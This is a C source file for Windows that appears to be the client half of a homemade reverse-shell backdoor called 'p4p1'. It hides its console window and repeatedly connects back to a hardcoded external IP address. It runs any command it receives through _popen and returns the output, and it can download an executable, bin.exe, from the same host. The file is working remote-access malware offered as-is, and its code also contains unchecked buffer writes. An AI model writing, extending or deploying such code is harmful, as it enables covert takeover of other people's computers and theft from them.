#include "p4p1-h_win.h"

int main(int argc, char * argv[])
{
    //Check if i want to hide output or not
	if(argc == 1)
		FreeConsole();           // BTW UPDATE THIS YOU CAN STILL SEE A TERMINAL POP UP

    // Create the basic variables so that you can get the port data
	int portno;     //number of port
	char portchar[6];   //Char retrieved from .cfg file
	FILE * fp = fopen("port.cfg", "r"); //Open up the cfg file

	if(fp == NULL){
		portno = 4441;      //If no file set up default port
	} else {
		int i = 0;
		char c;
		while( (c = fgetc(fp)) != EOF){     // Get char from file while not at EOF
			portchar[i] = c;
			i++;
		}
		portchar[i+1] = '\0';               //Terminate string

		portno = atoi(portchar);            //Set up custom port
	}
	fclose(fp);

	while(1){
		/* startup wsa*/
		WSADATA wsa;
		if(WSAStartup(MAKEWORD(2, 2), &wsa) != NO_ERROR){
			fprintf(stderr, "Client : Error at wsastartup.\n"); // Output error
		}

		/* initialize socket */
		SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if(s == INVALID_SOCKET){
			fprintf(stderr, "Client : socket() - Error at socket(): %i\n", //Output error
			WSAGetLastError());
			WSACleanup();
			return -1;
		}

		/* setup variables */
		int cn;							//connect
		FILE *pPipe;						//command pipe
		int bytesSent;                  //number of bytes ent
		int bytesRecv;              // number of bytes received
		char sessionID[5];					// Session id given by serv
		char buf[BUFSIZE] = "";					//buf
		char prompt[10] = "\n<p4p1 /> ";			//prompt if no session id

		bytesSent = 0;
		bytesRecv = SOCKET_ERROR;

		struct sockaddr_in client;				//server to connect information
		client.sin_family = AF_INET;
		client.sin_port = htons(portno);
		if(LOCAL){
			client.sin_addr.s_addr = inet_addr(xstr(192.168.1.17));
		} else {
			client.sin_addr.s_addr = inet_addr(xstr(86.247.192.29));
		}


		/* create pointers so that the synthacts get faster*/
		int * pbs = &bytesSent;
		int * pbr = &bytesRecv;

		/* connect */

		do{
			cn = connect(s, (SOCKADDR*) &client, sizeof(client));
		} while( cn == SOCKET_ERROR);

		/* receive session ID */

         *pbr = SOCKET_ERROR;
				 	// turn this into a function because it looks like shit
         while(*pbr == SOCKET_ERROR){
                *pbr = recv(s, buf, BUFSIZE, 0);
                if(*pbr == 0 || *pbr == WSAECONNRESET){
                    break;
                }

                if(*pbr < 0){
                    return -1;
                } else {
                    strcpy(sessionID, buf);
                    memset(buf, 0, BUFSIZE);
                }
            }

		while(cn != SOCKET_ERROR){

			/*
             *Send Prompt if no session ID
             **/
            if(sessionID == "0"){	//this is if you use netcat. if not the prompt should be on the server
                *pbs = send(s, prompt, sizeof(prompt), 0);
                if(*pbs == SOCKET_ERROR) { //server disconnected!
                    if(WSAGetLastError() != WSAECONNREFUSED
                        || WSAGetLastError() == WSAECONNRESET){
                        break;
                    } else {
                        printf("connection refused\n");
                        return -1;
                    }
                }
            }
			*pbr = SOCKET_ERROR;

			while(*pbr == SOCKET_ERROR){
				*pbr = recv(s, buf, BUFSIZE, 0);
				if(*pbr == 0 || *pbr == WSAECONNRESET){
					break;
				}

				if(bytesRecv < 0){
					return -1;
				} else {
					/*process received data*/
					if(iscommand(buf[0]) == 1 || iscommand(buf[0]) == 2
						|| iscommand(buf[0]) == 3){
						if(iscommand(buf[0]) == 2){	// custom p4p1 command
							memset(buf, 0, BUFSIZE);
							goto close;
						} else if (iscommand(buf[0]) == 1) {
							memset(buf, 0, BUFSIZE);
							download();
							strcpy(buf, "file downloaded from 86.247.192.29 / bin.exe\n");
						} else {
							memset(buf, 0, BUFSIZE);
							strcpy(buf, "Command non recognized.\n");
						}

					} else {
						if( (pPipe = _popen( buf, "r" )) == NULL ){
							memset(buf, 0, BUFSIZE);
							strcpy(buf, "error in command");
							printf("error in cmd\n");
						} else {
							memset(buf, 0, BUFSIZE);
							int i = 0;
							char ch;
							while((ch = fgetc(pPipe)) != EOF){
								buf[i] = ch;
								i++;
							}
						}
					}
				}
			}

			*pbs = send(s, buf, BUFSIZE, 0);
			if(*pbs == SOCKET_ERROR) { //server disconnected!
				if(WSAGetLastError() != WSAECONNREFUSED
				|| WSAGetLastError() == WSAECONNRESET){
					break;
				} else {
					printf("connection refused\n");
					return -1;
				}
			}
			*pbr = SOCKET_ERROR;
		}
		close:
		WSACleanup();
		_pclose(pPipe);
	}
	return 0;
}
